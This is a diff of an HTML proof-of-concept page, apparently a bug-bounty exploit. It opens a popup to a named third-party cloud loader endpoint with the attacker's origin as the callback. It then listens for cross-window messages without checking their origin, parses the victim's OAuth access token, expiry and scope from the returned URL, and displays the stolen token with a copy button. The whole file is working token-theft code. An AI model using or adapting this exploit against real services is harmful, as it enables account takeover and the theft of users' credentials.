@@ -3,35 +3,27 @@
 <body>
 <script>
 window.addEventListener("message", function(e) {
-    console.log("Origin:", e.origin);
-    console.log("Data:", e.data);
-    
-    var output = document.getElementById("output");
-    if (output) {
-        output.innerHTML += "<p><strong>Origin:</strong> " + e.origin + "</p>" +
-                           "<p><strong>Data:</strong> " + e.data + "</p><hr>";
-    }
-    
     if (e.data?.startsWith("logged_in:")) {
-        const token = e.data.split("access_token=")[1]?.split("&")[0];
-        console.log("🎯 ACCESS_TOKEN:", token);
+        const url = new URL(e.data.replace("logged_in:", ""));
+        const hash = new URLSearchParams(url.hash.slice(1));
+        const token = hash.get("access_token");
         
-        if (output) {
-            output.innerHTML = "<h2 style='color:red'>🎯 TOKEN CAPTURED!</h2>" +
-                "<p><strong>Access Token:</strong> " + token + "</p>" +
-                "<p><strong>Full Data:</strong></p><pre>" + e.data + "</pre>";
-        }
+        document.body.innerHTML = `
+            <h2 style="color:green">✅ Token Captured</h2>
+            <table style="border-collapse:collapse;width:100%;max-width:600px">
+                <tr><td style="padding:5px;border:1px solid #ddd"><b>Origin</b></td><td style="padding:5px;border:1px solid #ddd">${e.origin}</td></tr>
+                <tr><td style="padding:5px;border:1px solid #ddd"><b>Access Token</b></td><td style="padding:5px;border:1px solid #ddd;font-family:monospace;font-size:11px">${token?.slice(0,50)}...<br><button onclick="navigator.clipboard.writeText('${token}')">📋 Copy</button></td></tr>
+                <tr><td style="padding:5px;border:1px solid #ddd"><b>Expires In</b></td><td style="padding:5px;border:1px solid #ddd">${hash.get("expires_in")}s</td></tr>
+                <tr><td style="padding:5px;border:1px solid #ddd"><b>Scope</b></td><td style="padding:5px;border:1px solid #ddd;font-size:11px">${hash.get("scope")?.split(" ").slice(0,2).join(" ")}...</td></tr>
+            </table>
+        `;
     }
 }, false);
 
 var url = "https://cloudloader.default.prod.walmart.dice.livelinklabs.com/picasa?" +
-    "source_url=" + encodeURIComponent(location.origin) + 
-    "&live_update=true";
+    "source_url=" + encodeURIComponent(location.origin) + "&live_update=true";
 window.open(url, "popup", "width=800,height=600");
 </script>
-
-<div id="output">
-    <p>Waiting for postMessage...</p>
-</div>
+<p>Waiting...</p>
 </body>
 </html>
